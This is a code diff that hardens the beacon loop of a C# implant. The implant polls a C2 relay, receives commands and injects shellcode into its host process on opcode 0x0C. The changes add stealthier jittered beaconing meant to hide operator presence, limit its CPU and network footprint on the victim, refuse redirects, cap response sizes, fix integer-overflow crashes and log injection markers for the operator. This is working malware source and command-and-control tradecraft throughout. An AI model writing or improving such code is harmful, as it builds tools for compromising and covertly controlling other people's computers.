@@ -15,13 +15,39 @@ namespace CSharpAgent
     //     since the last POST, empty when none;
     //   • every successful answer is 200 whose body is the same frame stream of the
     //     queued [opcode][payload] commands (batched up to 32 frames / 4 MiB) — an
-    //     empty body means nothing is queued, re-POST immediately (the relay's 20–30 s
-    //     long-poll hold is the only sleep);
+    //     empty body means nothing is queued: re-POST immediately when the relay HELD
+    //     the request (attached C2 — that hold IS the sleep), but an empty answer that
+    //     returned FAST means no panel is attached and the loop paces itself locally
+    //     (FastEmptyAnswerMs below);
     //   • any non-200 answer or transport failure is FATAL — Run() returns and the
     //     deserialization below us unwinds. No retry loop: presence is re-established by
     //     re-delivery, not by burning CPU against a dead relay.
     internal static class Beacon
     {
+        // The relay batches commands up to 32 frames / 4 MiB — anything past these caps is
+        // not the relay this agent has a contract with. A hostile endpoint could otherwise
+        // stream an endless body into memory (the reader used to go to EOF) or drown the
+        // dispatcher in millions of tiny frames. Over-cap reads as a hostile body: the
+        // same fatal as a non-200. The thresholds sit deliberately ABOVE the relay's own
+        // 32-frame / 4 MiB batch contract (2x / 1.25x headroom) — a near-miss legitimate
+        // batch is never executed as hostile; only streams past the contract die here.
+        private const long MaxResponseBytes = 5L * 1024 * 1024;
+        private const int MaxResponseFrames = 64;
+
+        // The relay holds a poll 25-35 s ONLY while a C2 panel is attached; detached, it
+        // answers an IMMEDIATE empty 200 (hub.ts: "if (!this.c2) return emptyBeaconAnswer()").
+        // An empty answer that came back faster than any hold could have means nobody is
+        // holding — pace ourselves locally instead of free-spinning (audit No.23: measured
+        // ~2,200 POST/s on loopback against an unheld relay — victim CPU burn plus a request
+        // storm on the worker). 10 s sits safely between "instant" and the 25 s hold floor.
+        private const long FastEmptyAnswerMs = 10000;
+        // Mirrors the relay's own hold window: the POST cadence stays ~1 per 25-35 s whether
+        // or not a panel is watching — the agent's request rate never reveals operator
+        // presence, and a jittered sleep is not a metronome.
+        private const int IdleSleepMinMs = 25000;
+        private const int IdleSleepMaxMs = 35000;
+        private static readonly Random _idleJitter = new Random();
+
         internal static void Run(string beaconUrl)
         {
 #if DEBUG
@@ -52,8 +78,10 @@ namespace CSharpAgent
             }
             catch { }
 #endif
-            try { ServicePointManager.Expect100Continue = false; }
-            catch { }
+            // Expect100Continue is scoped to OUR endpoint's ServicePoint inside Post(), not
+            // flipped process-globally: the host's own HTTP stack keeps its 100-continue
+            // semantics (audit No.29 — a resident implant does not mutate the foreign
+            // process's network behavior beyond what its own requests need).
 
             var headers = Identity.Build();
             _beaconUrl = beaconUrl;
@@ -87,11 +115,12 @@ namespace CSharpAgent
                 post++;
 #if DEBUG
                 // [6] only on the FIRST POST — healthy idle iterations stay silent (a line
-                // per 20-30 s long-poll would grow the file forever).
+                // per 25-35 s long-poll would grow the file forever).
                 if (post == 1)
                     Diag.Show("[6] POST #1", "sending " + BuildFrames(pending).Length +
                         " bytes — the owed first beacon rides this one");
 #endif
+                var watch = System.Diagnostics.Stopwatch.StartNew();
                 byte[] responseBody;
 #if DEBUG
                 try { responseBody = Post(beaconUrl, headers, BuildFrames(pending)); }
@@ -108,6 +137,7 @@ namespace CSharpAgent
                 try { responseBody = Post(beaconUrl, headers, BuildFrames(pending)); }
                 catch (Exception) { responseBody = null; }
 #endif
+                var elapsedMs = watch.ElapsedMilliseconds;
                 if (responseBody == null)
                 {
 #if DEBUG
@@ -130,9 +160,26 @@ namespace CSharpAgent
 #if DEBUG
                     Diag.Show("[exit] malformed", "response body is not a valid [u32le len][bytes] frame stream — fatal");
 #endif
+                    // Same death-notice ship as the non-200 fatal above: a malformed body
+                    // was the one fatal path that died silently — the operator saw the
+                    // agent vanish with no "beacon failed" line at all.
+                    Log("beacon failed — malformed response body");
                     return; // malformed body — fatal, same as a bad status
                 }
-                if (frames.Count == 0) continue;
+                if (frames.Count == 0)
+                {
+                    // Empty AND fast = the detached relay (a held poll returns after 25-35 s).
+                    // Sleep the hold locally: same cadence as the attached state, no free-spin.
+                    if (elapsedMs < FastEmptyAnswerMs)
+                    {
+#if DEBUG
+                        Diag.Show("[pace] unheld", "empty answer in " + elapsedMs +
+                            " ms — no panel attached; sleeping the hold locally");
+#endif
+                        System.Threading.Thread.Sleep(_idleJitter.Next(IdleSleepMinMs, IdleSleepMaxMs));
+                    }
+                    continue;
+                }
                 foreach (var command in frames)
                 {
 #if DEBUG
@@ -217,7 +264,10 @@ namespace CSharpAgent
                 try
                 {
                     var binLen = command.Length >= 9 ? BitConverter.ToInt32(command, 5) : 0;
-                    if (binLen <= 0 || 9 + binLen > command.Length)
+                    // Widen before comparing: 9 + binLen wraps negative near int.MaxValue and
+                    // slips past this guard (the same CWE-190 shape as ParseFrames below) —
+                    // contained here only because Dispatch's try catches the failed allocation.
+                    if (binLen <= 0 || 9 + (long)binLen > command.Length)
                     {
 #if DEBUG
                         Diag.Show("[exit] 0x0C", "bad or missing payload length — replying status 1 (nothing to inject)");
@@ -231,17 +281,46 @@ namespace CSharpAgent
                     {
                         var nl = Array.IndexOf(command, (byte)'\n', start);
                         var end = nl < 0 ? command.Length : nl;
-                        var line = Encoding.ASCII.GetString(command, start, end - start).TrimEnd('\r');
-                        var eq = line.IndexOf('=');
-                        if (eq > 0)
-                            Environment.SetEnvironmentVariable(line.Substring(0, eq), line.Substring(eq + 1),
+                        // Non-ASCII bytes never ride an env line: ASCII best-fit would
+                        // silently map them to '?', and a mangled W_URL makes the PIC
+                        // kill the host on arrival (audit No.29). Reject the whole line.
+                        var ascii = true;
+                        for (var i = start; i < end; i++)
+                            if (command[i] >= 0x80) { ascii = false; break; }
+                        var line = ascii
+                            ? Encoding.ASCII.GetString(command, start, end - start).TrimEnd('\r')
+                            : null;
+                        var eq = line != null ? line.IndexOf('=') : -1;
+                        // W_URL is the ONLY name the wire may set. This channel is a config
+                        // pipe for the payload, not an arbitrary-setenv primitive: an
+                        // unfiltered NAME lets a hostile relay mutate OUR host — PATH into
+                        // children, PROCESSOR_ARCHITECTURE (which the stub selector re-reads
+                        // per injection) into a deferred wrong-arch crash, or a W_URL
+                        // pre-seed that outlives a refused command (audit No.24).
+                        if (eq > 0 && line.Substring(0, eq) == "W_URL")
+                            Environment.SetEnvironmentVariable("W_URL", line.Substring(eq + 1),
                                 EnvironmentVariableTarget.Process);
                         if (nl < 0) break;
                         start = nl + 1;
                     }
+                    // The PIC bails hard — ExitProcess, no retry — when W_URL is missing OR
+                    // EMPTY (a literal empty entry can ride a raw CreateProcess environment
+                    // block, which GetEnvironmentVariable reports as "" rather than null —
+                    // audit No.25): a 0x0C without a usable W_URL is a command that kills
+                    // the host on arrival. Refuse to inject and reply status 1 instead.
+                    if (string.IsNullOrEmpty(Environment.GetEnvironmentVariable("W_URL")))
+                    {
+                        Log("0x0C refused — payload carries no W_URL (the PIC would kill the host)");
+                        return Reply(1, corrId);
+                    }
 #if DEBUG
                     Diag.Show("[0x0C] inject", "payload " + payload.Length + " bytes taken from the command — calling ShellcodeRunner.RunPayload");
 #endif
+                    // Last telemetry before a never-returning entry: on the success path
+                    // nothing of ours logs again (the PIC owns the thread from here), so
+                    // this line is the operator's injection marker — success then shows up
+                    // as the WebSocket agent appearing on the relay.
+                    Log("0x0C injecting " + payload.Length + " bytes");
                     ShellcodeRunner.RunPayload(payload);
 #if DEBUG
                     Diag.Show("[0x0C] done", "PIC agent injected into this process — staying resident, replying status 0");
@@ -281,7 +360,16 @@ namespace CSharpAgent
             var request = (HttpWebRequest)WebRequest.Create(url);
             request.Method = "POST";
             request.ContentType = "application/octet-stream";
-            // The relay holds each request 20–30 s server-side; keep generous headroom over
+            // The contract makes ANY non-200 fatal, but HttpWebRequest silently follows
+            // redirects by default — a 302 to a live URL reads as a clean 200 and the
+            // fatal never fires (observed live: the agent beaconed on through it).
+            request.AllowAutoRedirect = false;
+            // Scoped to THIS endpoint's ServicePoint, never to ServicePointManager (that
+            // would flip 100-continue off for the whole host process): our binary POSTs
+            // don't want the 100-continue round trip, the host's own traffic keeps its.
+            try { request.ServicePoint.Expect100Continue = false; }
+            catch { }
+            // The relay holds each request 25–35 s server-side; keep generous headroom over
             // that window (the JScript agent's receive timeout is 45 s for the same reason).
             request.Timeout = 60000;
             request.ReadWriteTimeout = 60000;
@@ -297,7 +385,11 @@ namespace CSharpAgent
                 if (response.StatusCode != HttpStatusCode.OK) return null;
                 using (var ms = new MemoryStream())
                 {
-                    CopyStream(response.GetResponseStream(), ms);
+                    if (!CopyStream(response.GetResponseStream(), ms))
+                    {
+                        Log("beacon failed — response body over " + MaxResponseBytes + " bytes, treating as hostile");
+                        return null;
+                    }
                     return ms.ToArray();
                 }
             }
@@ -332,26 +424,35 @@ namespace CSharpAgent
                 if (offset + 4 > body.Length) return null;
                 var length = BitConverter.ToInt32(body, offset);
                 offset += 4;
-                if (length < 0 || offset + length > body.Length) return null;
+                // Long sum: the int addition wraps negative for lengths near int.MaxValue,
+                // passing this check; the oversized new byte[length] below then throws
+                // OUTSIDE any try and kills the process instead of the contract's clean
+                // fatal (proven live: a 4-byte FF FF FF 7F body crashed the agent).
+                if (length < 0 || (long)offset + length > body.Length) return null;
                 var frame = new byte[length];
                 Buffer.BlockCopy(body, offset, frame, 0, length);
                 frames.Add(frame);
+                if (frames.Count > MaxResponseFrames) return null; // over the batch cap — hostile body
                 offset += length;
             }
             return frames;
         }
 
-        private static void CopyStream(Stream source, MemoryStream target)
+        /// <summary>Copy the response body into memory; false when it exceeds
+        /// MaxResponseBytes (a hostile stream — the caller treats it as fatal).</summary>
+        private static bool CopyStream(Stream source, MemoryStream target)
         {
             var buffer = new byte[64 * 1024];
             int read;
+            long total = 0;
             while ((read = source.Read(buffer, 0, buffer.Length)) > 0)
+            {
+                total += read;
+                if (total > MaxResponseBytes) return false;
                 target.Write(buffer, 0, read);
+            }
+            return true;
         }
 
-        private static byte[] U32Bytes(uint n)
-        {
-            return new[] { (byte)(n & 255), (byte)((n >> 8) & 255), (byte)((n >> 16) & 255), (byte)((n >> 24) & 255) };
-        }
     }
 }
